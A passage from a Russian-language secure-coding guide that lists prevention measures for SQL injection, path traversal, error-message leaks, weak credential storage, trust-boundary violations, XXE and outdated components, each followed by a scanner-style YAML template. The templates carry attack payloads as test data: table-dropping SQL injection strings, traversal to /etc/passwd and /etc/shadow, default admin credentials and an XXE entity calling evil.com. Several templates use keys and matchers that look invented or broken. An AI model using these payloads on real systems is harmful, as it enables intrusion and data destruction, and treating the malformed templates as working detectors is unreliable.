1. Принцип наименьших привилегий: убедитесь, что учетная запись пользователя базы данных, используемая веб-приложением, обладает наименьшими привилегиями, необходимыми для выполнения требуемых операций. Ограничьте права только теми конкретными таблицами и операциями, которые требуются приложению, что уменьшит потенциальное воздействие успешной атаки SQL-инъекции.

1. Безопасное управление учетными данными базы данных: Храните и управляйте учетными данными базы данных безопасно. Избегайте жесткого кодирования учетных данных в исходном коде или конфигурационных файлах. Вместо этого используйте безопасные механизмы хранения учетных данных, такие как переменные среды или безопасные хранилища ключей.

1. Реализуйте проверку ввода на стороне сервера: Хотя проверка ввода на стороне клиента обеспечивает лучший пользовательский опыт, на нее не следует полагаться в вопросах безопасности. Всегда выполняйте проверку и санацию ввода и на стороне сервера, поскольку проверку на стороне клиента можно обойти или манипулировать ею.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте свою систему управления базами данных (СУБД) в актуальном состоянии с помощью последних патчей безопасности. Производители СУБД часто выпускают обновления для устранения уязвимостей, в том числе связанных с SQL-инъекциями.

1. Внедрите строгий контроль доступа: Внедрите строгий контроль доступа на уровне приложений, чтобы ограничить доступ и действия пользователей. Используйте контроль доступа на основе ролей (RBAC), правильно аутентифицируйте и авторизуйте пользователей, чтобы они имели доступ только к соответствующим ресурсам и действиям.

1. Тестирование безопасности и проверка кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, для выявления уязвимостей SQL-инъекций в вашем веб-приложении. Используйте автоматические сканеры уязвимостей и привлекайте специалистов по безопасности для ручной оценки безопасности.

1. Безопасные методы разработки: Продвигайте практику безопасного кодирования в своей команде разработчиков. Просветите разработчиков о рисках, связанных с SQL-инъекциями, и организуйте обучение методам безопасного кодирования и лучшим практикам. Поощряйте использование фреймворков и библиотек безопасного кодирования, которые обеспечивают защиту от SQL-инъекций.

Применяя эти превентивные меры, вы сможете значительно снизить риск атак SQL Injection и защитить свое веб-приложение от несанкционированного доступа к базе данных или манипуляций с ней. Важно применять проактивный подход к обеспечению безопасности, сочетая методы безопасного кодирования, проверку ввода, параметризованные запросы и регулярное тестирование безопасности для поддержания целостности и безопасности взаимодействия вашего приложения с базой данных.



```
id: sql-injection
info:
  name: SQL Injection
  author: Your Name
  severity: high
  description: Detects potential SQL Injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - sql-injection
requests:
  - name: SQL Injection Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: fuzz
        payloads:
          - "' OR 1=1 --"
          - "'; DROP TABLE users; --"
          - "'; SELECT * FROM users; --"
      - type: regex
        part: body
        words:
          - 'error in your SQL syntax'
          - 'mysql_fetch_array()'
          - 'sqlite_fetch_array()'
```


### Внешнее управление именем или путем файла

Внешнее управление именем или путем файла - это уязвимость, возникающая, когда злоумышленник может манипулировать именем или путем файла, используемым в файловых операциях, что приводит к непреднамеренному или несанкционированному доступу к файлам в системе. Эта уязвимость может быть использована для чтения, перезаписи или выполнения произвольных файлов, что потенциально может нарушить безопасность и целостность приложения и базовой системы.

Чтобы предотвратить уязвимость External Control of File Name or Path, можно выполнить следующие профилактические меры:

1. Проверяйте и обеззараживайте вводимые файлы: Проверяйте и обеззараживайте любые связанные с файлами данные, полученные от пользователей или из внешних источников. Убедитесь, что имена файлов или пути к ним соответствуют ожидаемому формату и не содержат неожиданных или вредоносных символов. Санируйте входные данные, удаляя или экранируя любые символы, которые могут быть использованы для обхода путей или внедрения команд.

1. Используйте белые списки: Реализуйте подход "белых списков" для разрешенных имен файлов или путей. Определите список разрешенных символов, расширений файлов или путей к каталогам, которые считаются безопасными, и отклоняйте любые входные данные, которые не соответствуют белому списку. Это поможет предотвратить несанкционированный доступ к конфиденциальным файлам или системным каталогам.

1. Избегайте имен и путей к файлам, задаваемых пользователем: По возможности избегайте использования вводимых пользователем данных непосредственно в качестве имен файлов или путей к ним. Генерируйте имена файлов или пути программно, используя надежные и проверенные источники данных, такие как база данных или внутренняя конфигурация. Если ввод данных пользователем необходим, рассмотрите возможность использования защищенного механизма загрузки файлов, который хранит загруженные файлы в специально отведенном неисполняемом каталоге.

1. Ограничьте права доступа к файловой системе: Установите соответствующие разрешения на доступ к файлам и каталогам, чтобы ограничить привилегии приложения или процесса, обращающегося к ним. Убедитесь, что приложение запускается с наименьшими привилегиями, необходимыми для выполнения его операций, и ограничьте доступ к конфиденциальным файлам или системным каталогам.

1. Используйте специфические для платформы API-интерфейсы безопасного доступа к файлам: Используйте API-интерфейсы безопасного доступа к файлам, предоставляемые используемым языком программирования или фреймворком. Эти API часто содержат встроенные средства защиты от атак обхода пути или внедрения команд. Избегайте использования низкоуровневых методов доступа к файловой системе, которые могут быть более подвержены уязвимостям.

1. Внедрите средства контроля доступа к файлам: Реализуйте надлежащий контроль доступа к файлам в вашем приложении. Аутентифицируйте и авторизуйте пользователей, чтобы убедиться, что у них есть необходимые разрешения на доступ к определенным файлам или каталогам. Обеспечьте контроль доступа на уровне файлов на основе ролей или привилегий пользователей.

1. Безопасная загрузка и выгрузка файлов: Реализуйте механизмы безопасной загрузки и выгрузки файлов, которые проверяют типы файлов, их размеры и выполняют проверку на наличие вирусов и вредоносного ПО. Ограничьте допустимые расширения файлов, установите ограничения на размер и убедитесь, что загруженные файлы хранятся в безопасном месте.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте базовую операционную систему, библиотеки и зависимые компоненты в актуальном состоянии с помощью последних патчей безопасности. Патчи часто устраняют уязвимости, связанные с операциями файловой системы, и могут помочь снизить риск атак с внешним контролем имени файла или пути.

1. Тестирование безопасности и обзор кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, для выявления уязвимостей, связанных с файловыми операциями. Используйте автоматические сканеры уязвимостей или привлекайте специалистов по безопасности для проведения оценки безопасности вручную.

1. Обучайте разработчиков: Организуйте обучение разработчиков безопасным методам работы с файлами и рискам, связанным с уязвимостями внешнего контроля имени файла или пути к нему. Продвигайте методы безопасного кодирования и лучшие практики в своей команде разработчиков.

Реализовав эти превентивные меры, вы сможете значительно снизить риск возникновения уязвимостей, связанных с внешним контролем имени файла или пути к нему, и защитить свое приложение от несанкционированного доступа к файлам или манипулирования ими. Очень важно следовать практикам безопасного кодирования, проверять и обеззараживать вводимые файлы, а также регулярно обновлять свои системы для решения возникающих проблем безопасности.


```
id: file-path-injection
info:
  name: External Control of File Name or Path
  author: Your Name
  severity: medium
  description: Detects potential file path injection vulnerabilities in web applications.
  references:
    - https://example.com
tags:
  - web
  - file-path-injection
requests:
  - name: File Path Injection Test
    path:
      - /
      - /download
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/download?file={{.Fuzz}}"
            headers:
              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
            fuzz:
              - "../../../../etc/passwd"
              - "../../../../etc/shadow"
              - "../../../../etc/hosts"
```



### Генерация сообщения об ошибке, содержащего конфиденциальную информацию

Generation of Error Message Containing Sensitive Information - это уязвимость, которая возникает, когда сообщения об ошибках, генерируемые приложением, раскрывают конфиденциальную или секретную информацию. Это могут быть такие сведения, как строки подключения к базе данных, трассировка стека, учетные данные пользователя или другие конфиденциальные данные. Злоумышленники могут использовать эту информацию для получения информации об архитектуре системы, выявления потенциальных слабых мест или проведения дальнейших атак.

Чтобы предотвратить генерацию сообщений об ошибках, содержащих конфиденциальную информацию, можно принять следующие профилактические меры:

1. Отключите подробные сообщения об ошибках в производстве: Убедитесь, что производственная среда вашего приложения настроена на отображение общих сообщений об ошибках вместо подробной технической информации. Это поможет предотвратить непреднамеренное раскрытие конфиденциальных данных в сообщениях об ошибках.

1. Реализуйте пользовательскую обработку ошибок: Создайте пользовательские механизмы обработки ошибок, которые перехватывают и обрабатывают ошибки приложения, не раскрывая конфиденциальную информацию. Настройте сообщения об ошибках так, чтобы они предоставляли пользователям общую и удобную обратную связь, не раскрывая конкретных технических деталей.

1. Безопасно регистрируйте ошибки: Если ваше приложение регистрирует ошибки, убедитесь, что конфиденциальная информация не включена в записи журнала. Проверьте конфигурацию журнала, чтобы убедиться, что в него записывается только необходимая информация, и проведите санитарную обработку всех записанных в журнал данных, чтобы удалить конфиденциальные сведения.

1. Избегайте отображения конфиденциальной информации: Полностью откажитесь от отображения конфиденциальной информации в сообщениях об ошибках. Воздержитесь от включения в сообщения об ошибках таких конфиденциальных данных, как учетные данные пользователя, строки подключения к базе данных или внутренние пути системы. Вместо этого сосредоточьтесь на предоставлении пользователям полезной и действенной информации, не раскрывая конфиденциальных данных.

1. Используйте передовые методы обработки исключений: Используйте в коде правильные методы обработки исключений. Ловите и обрабатывайте исключения изящно, избегая распространения конфиденциальной информации в сообщениях об ошибках. Реализуйте структурированные механизмы обработки исключений, чтобы эффективно перехватывать и обрабатывать ошибки.

1. Регулярно тестируйте обработку ошибок: Проводите тщательное тестирование механизмов обработки ошибок в вашем приложении. Включите сценарии, в которых исключения намеренно вызываются, чтобы гарантировать, что конфиденциальная информация не будет раскрыта в сообщениях об ошибках. Используйте автоматические средства сканирования уязвимостей или привлекайте специалистов по безопасности для выявления потенциальных утечек информации.

1. Внедрите проверку и санацию ввода: Проверяйте и обеззараживайте вводимые пользователем данные, чтобы предотвратить возникновение ошибок, раскрывающих конфиденциальную информацию. Правильная проверка ввода помогает предотвратить распространенные векторы атак, такие как инъекционные атаки, которые могут привести к созданию сообщений об ошибках, содержащих конфиденциальные данные.

1. Соблюдайте правила безопасного кодирования: Соблюдайте правила и рекомендации по безопасному кодированию. Храните конфиденциальную информацию отдельно от сообщений об ошибках и убедитесь, что код обработки ошибок надежен и безопасен. Применяйте принципы безопасного кодирования на протяжении всего жизненного цикла разработки, чтобы свести к минимуму вероятность возникновения уязвимостей.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте приложение и его зависимости в актуальном состоянии с помощью последних патчей безопасности. Обновления программного обеспечения часто устраняют уязвимости безопасности, в том числе связанные с обработкой ошибок и потенциальным раскрытием конфиденциальной информации.

1. Обучайте разработчиков: Организуйте программы обучения и повышения осведомленности, чтобы рассказать разработчикам о рисках, связанных с сообщениями об ошибках, содержащими конфиденциальную информацию. Пропагандируйте практику безопасного кодирования и подчеркивайте важность правильной обработки и защиты сообщений об ошибках.

Реализовав эти превентивные меры, вы сможете минимизировать риск раскрытия конфиденциальной информации в сообщениях об ошибках и повысить уровень безопасности вашего приложения. Очень важно уделять приоритетное внимание защите конфиденциальных данных и регулярно пересматривать и обновлять механизмы обработки ошибок, чтобы они соответствовали лучшим практикам и развивающимся стандартам безопасности.


```
id: error-message-leak
info:
  name: Generation of Error Message Containing Sensitive Information
  author: Your Name
  severity: high
  description: Detects potential leakage of sensitive information in error messages.
  references:
    - https://example.com
tags:
  - web
  - error-message-leak
requests:
  - name: Error Message Leakage Test
    path:
      - /
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: "/login"
            headers:
              Content-Type: application/x-www-form-urlencoded
            body:
              username: "{{.Fuzz}}"
              password: "password"
            fuzz:
              - "' OR '1'='1"
              - "' OR 'a'='a"
              - "' OR '1'='1' --"
```



### Незащищенное хранение учетных данных

Под незащищенным хранением учетных данных понимается практика хранения конфиденциальных данных, таких как имена пользователей, пароли, ключи API или маркеры доступа, небезопасным способом. Это может включать хранение учетных данных открытым текстом, использование слабого шифрования или хранение их в легкодоступных местах, что делает их уязвимыми для несанкционированного доступа и потенциального использования злоумышленниками.

Чтобы предотвратить незащищенное хранение учетных данных, необходимо соблюдать следующие профилактические меры:

1. Используйте безопасные механизмы хранения учетных данных: Используйте безопасные методы хранения учетных данных, такие как защищенные базы данных, зашифрованные файлы или специальные системы управления учетными данными. Эти механизмы должны обеспечивать надежное шифрование и контроль доступа для защиты конфиденциальности и целостности хранимых учетных данных.

1. Избегайте хранения паролей в виде обычного текста: Никогда не храните пароли и конфиденциальные учетные данные в виде обычного текста. Вместо этого используйте надежные криптографические методы, такие как одностороннее хеширование с солью или функции выведения ключа, для безопасного хранения и проверки паролей.

1. Применяйте надежное шифрование: Если вам необходимо хранить учетные данные в файле или базе данных, убедитесь, что они зашифрованы с помощью надежных алгоритмов и ключей шифрования. Используйте стандартные библиотеки и алгоритмы шифрования, чтобы защитить учетные данные от несанкционированного доступа.

1. Отделяйте учетные данные от исходного кода: Избегайте хранения учетных данных непосредственно в исходном коде или конфигурационных файлах, которые являются частью систем контроля версий. Отделите учетные данные от кодовой базы и используйте конфигурационные файлы для конкретного окружения или средства управления безопасными секретами для предоставления необходимых учетных данных во время выполнения.

1. Безопасное управление ключами API и маркерами доступа: При работе с API-ключами или маркерами доступа следуйте лучшим практикам, предоставляемым соответствующим сервисом или фреймворком. Избегайте жесткого кодирования этих учетных данных, а вместо этого используйте безопасные переменные окружения или специальные файлы конфигурации для их хранения и получения.

1. Внедрите средства контроля доступа: Обеспечьте надлежащий контроль доступа, чтобы ограничить доступ к конфиденциальным учетным данным. Предоставляйте доступ только тем уполномоченным лицам, которым он необходим для выполнения определенных ролей или задач. Регулярно проверяйте и обновляйте разрешения на доступ, чтобы убедиться, что только доверенные лица имеют доступ к учетным данным.

1. Регулярно ротируйте учетные данные: Внедрите политику ротации учетных данных, которая предусматривает периодическую смену паролей, ротацию ключей или выдачу новых маркеров доступа. Регулярная ротация учетных данных снижает риск длительного воздействия и несанкционированного доступа к важным системам.

1. Контролируйте и регистрируйте доступ к учетным данным: Внедрите механизмы регистрации и мониторинга для отслеживания доступа к конфиденциальным учетным данным. Регулярно просматривайте журналы на предмет любых подозрительных или несанкционированных попыток доступа. Мониторинг помогает обнаружить любые потенциальные нарушения или несанкционированное использование учетных данных.

1. Обучите пользователей безопасному управлению учетными данными: Организуйте программы обучения и повышения осведомленности, чтобы рассказать пользователям и разработчикам о важности безопасного управления учетными данными. Подчеркните риски, связанные с незащищенным хранением учетных данных, и пропагандируйте безопасное кодирование и методы работы с ними.

1. Регулярная оценка и аудит: Проводите регулярные оценки и аудиты безопасности, чтобы выявить любые потенциальные уязвимости и недостатки в хранении и управлении учетными данными. Используйте автоматизированные средства сканирования или привлекайте специалистов по безопасности для проведения тщательной оценки.

Применяя эти превентивные меры, вы сможете значительно снизить риск незащищенного хранения учетных данных и повысить безопасность ваших приложений и систем. Защита конфиденциальных учетных данных имеет решающее значение для защиты пользовательских данных, предотвращения несанкционированного доступа и сохранения доверия пользователей.


```
id: unprotected-credentials
info:
  name: Unprotected Storage of Credentials
  author: Your Name
  severity: high
  description: Detects unprotected storage of sensitive credentials.
  references:
    - https://example.com
tags:
  - web
  - unprotected-credentials
requests:
  - name: Unprotected Credential Storage Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/config"
          - method: GET
            path: "/credentials"
```


### Нарушение границ доверия

Нарушение границ доверия - это уязвимость безопасности, которая возникает, когда данные или управление пересекают границу доверия без надлежащей проверки или авторизации. Это происходит, когда данные из недоверенного источника рассматриваются как доверенные или когда не обеспечивается надлежащий контроль доступа на границе между доверенными и недоверенными компонентами или системами. Такое нарушение может привести к несанкционированному доступу, утечке данных, повышению привилегий или выполнению вредоносного кода.

Чтобы предотвратить нарушение границ доверия, необходимо соблюдать следующие профилактические меры:

1. Проверяйте и обеззараживайте вводимые данные: Проверяйте и обеззараживайте все входные данные, полученные из недоверенных источников, таких как пользовательский ввод, вызовы API или данные из внешних систем. Применяйте строгие методы проверки и фильтрации входных данных, чтобы гарантировать, что только безопасные и ожидаемые данные передаются через границы доверия.

1. Внедряйте надежную аутентификацию и авторизацию: Применяйте надежные механизмы аутентификации и авторизации, чтобы только уполномоченные лица могли получить доступ к важным ресурсам или выполнять критические операции. Внедрите средства контроля доступа на границах доверия для предотвращения несанкционированного доступа.

1. Применяйте принцип наименьших привилегий: Предоставляйте пользователям, компонентам или системам только минимальные привилегии, необходимые для выполнения их задач. Избегайте предоставления ненужных разрешений или повышенных привилегий, которые потенциально могут привести к нарушению границ доверия.

1. Используйте безопасные протоколы связи: Когда данные пересекают границы доверия, убедитесь, что используются безопасные протоколы связи, такие как SSL/TLS, для защиты конфиденциальности и целостности данных при передаче. Шифруйте конфиденциальные данные, чтобы предотвратить их перехват или фальсификацию.

1. Внедрите безопасное управление сеансами: Если сеансы используются для сохранения состояния или контекста пользователя, обеспечьте надлежащее управление сеансами. Используйте маркеры безопасных сеансов, обеспечивайте таймауты сеансов и защищайте от атак фиксации или перехвата сеанса.

1. Разделяйте и изолируйте компоненты: Четко определите границы доверия между различными компонентами или системами и обеспечьте их соблюдение. Изолируйте ненадежные компоненты или системы от надежных, чтобы минимизировать последствия потенциального нарушения или компрометации.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте все компоненты, фреймворки, библиотеки и системы в актуальном состоянии с помощью последних патчей безопасности. Регулярно проверяйте и обновляйте конфигурации безопасности, чтобы устранить все известные уязвимости, которые могут привести к нарушению границ доверия.

1. Реализуйте мониторинг во время выполнения и обнаружение аномалий: Разверните системы мониторинга, способные обнаруживать и предупреждать о необычном или неожиданном поведении на границах доверия. Отслеживайте подозрительные действия, неожиданные потоки данных или попытки несанкционированного доступа.

1. Проводите тестирование безопасности и анализ кода: Регулярно проводите тестирование безопасности, включая тестирование на проникновение и анализ кода, чтобы выявить и устранить все уязвимости границ доверия. Проверяйте устойчивость системы к нарушениям границ и эффективность внедренных средств контроля безопасности.

1. Проводите обучение по вопросам безопасности: Проинформируйте разработчиков и системных администраторов о рисках и последствиях нарушения границ доверия. Пропагандируйте осведомленность о безопасности и проводите тренинги по безопасному кодированию, безопасному управлению конфигурацией и важности соблюдения границ доверия.

Следуя этим профилактическим мерам, вы сможете снизить риск нарушения границ доверия и повысить общую безопасность вашего приложения или системы. Очень важно установить четкие границы доверия, внедрить соответствующие средства контроля безопасности, а также регулярно контролировать и обновлять свои системы, чтобы предотвратить несанкционированный доступ или компрометацию через границы доверия.

```
id: trust-boundary-violation
info:
  name: Trust Boundary Violation
  author: Your Name
  severity: medium
  description: Detects trust boundary violations in the application.
  references:
    - https://example.com
tags:
  - web
  - trust-boundary-violation
requests:
  - name: Trust Boundary Violation Test
    path:
      - /
      - /admin
      - /user
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: "/user-details?admin=true"
          - method: GET
            path: "/admin-details?user=true"
```


### Недостаточно защищенные учетные данные

Недостаточно защищенные учетные данные - это уязвимость безопасности, которая возникает, когда конфиденциальные данные, такие как имена пользователей, пароли, ключи API или маркеры доступа, не защищены должным образом, что делает их уязвимыми для несанкционированного доступа или неправомерного использования. Это может произойти из-за слабого шифрования, ненадлежащего хранения или неадекватного контроля доступа, что подвергает риску конфиденциальную информацию.

Чтобы предотвратить использование недостаточно защищенных учетных данных, необходимо соблюдать следующие профилактические меры:

1. Используйте надежное шифрование: Убедитесь, что конфиденциальные данные должным образом зашифрованы с использованием надежных алгоритмов и ключей шифрования. Используйте стандартные методы шифрования для защиты конфиденциальности и целостности хранимых учетных данных.

1. Используйте безопасные механизмы хранения: Храните учетные данные в защищенных системах хранения, таких как зашифрованные базы данных или защищенные хранилища ключей, которые обеспечивают соответствующий контроль доступа и защиту от несанкционированного доступа. Избегайте хранения учетных данных в виде открытого текста или в незащищенных местах.

1. Избегайте жесткого кодирования учетных данных: Следует избегать жесткого кодирования учетных данных непосредственно в исходном коде или конфигурационных файлах. Вместо этого используйте переменные среды, безопасные инструменты управления секретами или файлы конфигурации с ограниченным доступом для хранения и извлечения учетных данных.

1. Реализуйте безопасную передачу учетных данных: При передаче учетных данных используйте защищенные протоколы связи, такие как SSL/TLS, для шифрования передаваемых данных. Не передавайте учетные данные по незащищенным каналам и не включайте их в параметры URL.

1. Применяйте принцип наименьших привилегий: Предоставляйте учетным данным только минимальные привилегии, необходимые для обеспечения требуемой функциональности. Избегайте предоставления ненужных или чрезмерных привилегий, чтобы уменьшить потенциальное воздействие компрометации учетных данных.

1. Применяйте строгие политики паролей: Внедряйте политики надежных паролей, поощряющие пользователей к созданию сложных и уникальных паролей. Обеспечьте истечение срока действия пароля и предоставьте механизмы для сброса пароля или восстановления учетной записи.

1. Внедрите многофакторную аутентификацию (MFA): Используйте MFA для обеспечения дополнительного уровня безопасности. Требуйте от пользователей предоставления дополнительных факторов аутентификации, таких как одноразовый пароль, основанный на времени (TOTP) или биометрические данные, для доступа к важным ресурсам.

1. Регулярная ротация учетных данных: Установите политику ротации учетных данных, которая предусматривает периодическую смену паролей, ротацию ключей или восстановление токенов. Регулярно обновляйте и ротируйте учетные данные, чтобы ограничить окно риска в случае компрометации.

1. Внедряйте методы безопасного кодирования: Соблюдайте правила безопасного кодирования, чтобы свести к минимуму риск непреднамеренного раскрытия учетных данных. Избегайте регистрации или отображения учетных данных в сообщениях об ошибках или отладочных выводах. Применяйте методы безопасного кодирования для защиты от таких распространенных уязвимостей, как инъекционные атаки.

1. Регулярно проводите оценку безопасности: Регулярно проводите оценку безопасности и тестирование на проникновение, чтобы выявить уязвимости и слабые места в защите учетных данных. Привлекайте специалистов по безопасности или используйте автоматизированные средства сканирования уязвимостей для выявления потенциальных проблем.

1. Обучайте пользователей и разработчиков: Повысьте осведомленность пользователей и разработчиков о важности защиты учетных данных. Организуйте обучение методам безопасного кодирования, управления паролями и рискам, связанным с недостаточной защитой учетных данных.

Применяя эти превентивные меры, вы сможете значительно снизить риск использования недостаточно защищенных учетных данных и повысить безопасность своих систем. Защита конфиденциальных учетных данных имеет решающее значение для обеспечения сохранности пользовательских данных, предотвращения несанкционированного доступа и поддержания доверия пользователей.



```
id: insufficiently-protected-credentials
info:
  name: Insufficiently Protected Credentials
  author: Your Name
  severity: high
  description: Detects instances where sensitive credentials are insufficiently protected.
  references:
    - https://example.com
tags:
  - web
  - insufficiently-protected-credentials
requests:
  - name: Insufficiently Protected Credentials Test
    path:
      - /
      - /admin
      - /login
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /login
            headers:
              - name: Content-Type
                value: application/x-www-form-urlencoded
            body: "username=admin&password=admin"
            matchers:
              - type: word
                words:
                  - "Invalid username or password"
```


### Ограничение ссылки на внешнюю сущность XML

Ограничение ссылки на внешние сущности XML (XXE) - это уязвимость безопасности, которая возникает, когда парсер XML обрабатывает внешние сущности, включенные в XML-вход. Злоумышленники могут использовать эту уязвимость для чтения конфиденциальных данных с сервера или проведения атак типа "отказ в обслуживании".

Для предотвращения XXE-уязвимостей необходимо соблюдать следующие профилактические меры:

1. Отключите обработку внешних сущностей: Настройте парсер XML на отключение обработки внешних сущностей. Это не позволит парсеру XML разрешать и включать внешние сущности в XML-вход.

1. Валидация и санитарная обработка входных данных XML: Применяйте надлежащие методы проверки и обеззараживания входных данных, чтобы гарантировать, что обрабатываются только ожидаемые и безопасные XML-данные. Используйте строгие настройки синтаксического анализа и отклоняйте или обеззараживайте любые недоверенные или неожиданные входные данные XML.

1. Используйте белые списки и фильтрацию: Внедрите механизмы "белых списков" или фильтрации, чтобы разрешить только известные безопасные XML-структуры и отклонить или удалить любые потенциально вредоносные XML-конструкции или элементы.

1. Перейдите на безопасный парсер XML: Используйте последнюю версию безопасной и хорошо поддерживаемой библиотеки парсера XML. Старые версии XML-парсеров могут иметь известные уязвимости, которые могут быть использованы злоумышленниками.

1. Реализуйте наименьшие привилегии: Ограничьте привилегии доступа к XML-парсеру, чтобы свести к минимуму потенциальное воздействие атаки XXE. Убедитесь, что парсер XML запускается с минимальными привилегиями, необходимыми для выполнения его функций.

1. Избегайте использования управляемого пользователем XML: Избегайте использования управляемого пользователем XML в конфиденциальных операциях или при обработке. Если требуется использование пользовательского XML, обеспечьте строгую проверку и санацию входных данных, чтобы снизить риск возникновения уязвимостей XXE.

1. Реализуйте фильтрацию и проверку ввода на стороне сервера: Применяйте методы проверки и фильтрации ввода на стороне сервера для предотвращения уязвимостей XXE. Проверяйте и обеззараживайте все XML-данные, полученные от клиентов, перед их обработкой на сервере.

1. Соблюдайте правила безопасного кодирования: При работе с XML-данными придерживайтесь практики безопасного кодирования. Избегайте конкатенации XML-строк или динамического построения XML с использованием недоверенных входных данных, поскольку это может привести к появлению уязвимостей XML-инъекций.

1. Регулярно обновляйте и ставьте заплатки: Поддерживайте парсер XML и связанные с ним библиотеки в актуальном состоянии с помощью последних исправлений безопасности. Будьте в курсе всех рекомендаций по безопасности или обновлений, связанных с парсером XML, чтобы устранить все известные уязвимости.

1. Проводите тестирование безопасности: Проводите тестирование безопасности, включая оценку уязвимостей и тестирование на проникновение, для выявления и устранения уязвимостей XXE. Проверьте устойчивость приложения к различным векторам атак XXE и убедитесь в эффективности внедренных средств контроля безопасности.

Применяя эти превентивные меры, вы сможете снизить риск возникновения уязвимостей XXE и повысить безопасность обработки XML. Необходимо быть осторожным при работе с XML-данными, применять безопасные методы кодирования и поддерживать парсер XML в актуальном состоянии, чтобы предотвратить использование уязвимостей XXE злоумышленниками.


```
id: restriction-of-xxe-reference
info:
  name: Restriction of XML External Entity Reference
  author: Your Name
  severity: medium
  description: Detects instances where XML parsing allows external entity references, potentially leading to XXE vulnerabilities.
  references:
    - https://example.com
tags:
  - web
  - restriction-of-xxe-reference
requests:
  - name: Restriction of XXE Reference Test
    path:
      - /
      - /admin
      - /api
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: POST
            path: /api/parse-xml
            headers:
              - name: Content-Type
                value: application/xml
            body: |
              <?xml version="1.0" encoding="UTF-8"?>
              <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
              <root>&xxe;</root>
            matchers:
              - type: word
                words:
                  - "XXE detected"
```


### Уязвимые и устаревшие компоненты

Уязвимые и устаревшие компоненты - это сторонние библиотеки, фреймворки или программные компоненты, которые имеют известные уязвимости в системе безопасности или больше не поддерживаются исправлениями. Использование таких компонентов может создать риски для безопасности вашего приложения или системы, поскольку злоумышленники могут использовать эти уязвимости для получения несанкционированного доступа или компрометации системы.

Чтобы предотвратить использование уязвимых и устаревших компонентов, необходимо соблюдать следующие профилактические меры:

1. Вести инвентаризацию компонентов: Создайте и ведите реестр всех сторонних компонентов, используемых в вашем приложении или системе. Следите за номерами версий и источниками этих компонентов.

1. Будьте в курсе обновлений безопасности: Следите за последними рекомендациями по безопасности и отчетами об уязвимостях используемых компонентов. Подпишитесь на списки рассылки по безопасности или следите за официальными источниками, чтобы получать уведомления об исправлениях и обновлениях безопасности.

1. Регулярно обновляйте компоненты: Регулярно обновляйте компоненты вашего приложения или системы до последних стабильных и безопасных версий. Проверяйте наличие обновлений безопасности и своевременно применяйте исправления. Убедитесь, что процесс обновления хорошо документирован и регулярно тестируется.

1. Используйте базы данных уязвимостей: Используйте базы данных уязвимостей и ресурсы по безопасности, которые предоставляют информацию об известных уязвимостях в компонентах. Регулярно проверяйте эти ресурсы, чтобы выявить уязвимости в используемых компонентах и принять соответствующие меры.

1. Проводите оценку безопасности: Регулярно проводите оценку безопасности и сканирование уязвимостей, чтобы выявить все уязвимости, созданные компонентами. Используйте автоматизированные инструменты или привлекайте специалистов по безопасности для проведения тестирования безопасности и проверки кода.

1. Следите за поддержкой компонентов: Следите за статусом поддержки используемых компонентов. Если компонент больше не поддерживается или его срок службы истек, подумайте о поиске альтернативных компонентов или решений. В неподдерживаемых компонентах с большей вероятностью будут присутствовать непропатченные уязвимости.

1. Внедрите процесс управления исправлениями: Установите процесс управления исправлениями, чтобы обеспечить своевременное применение исправлений и обновлений безопасности для компонентов. Этот процесс должен включать тестирование патчей в контролируемой среде перед их развертыванием в производстве.

1. Рассмотрите возможность использования средств мониторинга безопасности: Внедрите средства мониторинга безопасности, которые могут обнаруживать и предупреждать вас об уязвимостях или потенциальных рисках, связанных с используемыми компонентами. Эти инструменты помогут вам выявить любые проблемы безопасности на ранней стадии и предпринять необходимые шаги по их устранению.

1. Соблюдайте правила безопасного кодирования: Разработайте методы безопасного кодирования, чтобы свести к минимуму вероятность появления уязвимостей в вашем собственном коде. Регулярно просматривайте и обновляйте свой код, чтобы убедиться, что он не использует уязвимые или устаревшие компоненты.

1. Включите оценку компонентов в процесс закупок: При выборе новых компонентов учитывайте их репутацию в области безопасности, частоту обновлений и поддержку сообщества. Выбирайте компоненты, которые имеют хорошую репутацию в области безопасности и активно поддерживаются.

Следуя этим профилактическим мерам, вы сможете снизить риск использования уязвимых и устаревших компонентов в вашем приложении или системе. Регулярное обновление компонентов, информирование об обновлениях безопасности и проведение оценок безопасности - все это необходимо для поддержания безопасной экосистемы программного обеспечения.


```
id: vulnerable-and-outdated-components
info:
  name: Vulnerable and Outdated Components
  author: Your Name
  severity: high
  description: Detects vulnerable and outdated components in web applications.
  references:
    - https://example.com
tags:
  - web
  - vulnerable-and-outdated-components
requests:
  - name: Vulnerable and Outdated Components Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /info
            headers:
              - name: User-Agent
                value: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
            matchers:
              - type: word
                words:
                  - "Vulnerable component detected"
```


### Неправильная проверка сертификата с несоответствием хоста

Improper Validation of Certificate with Host Mismatch - это уязвимость безопасности, которая возникает, когда клиентское приложение не может должным образом проверить сертификат SSL/TLS сервера во время безопасного рукопожатия связи. Эта уязвимость позволяет злоумышленнику выдать себя за сервер, представив сертификат, который не соответствует ожидаемому хосту.

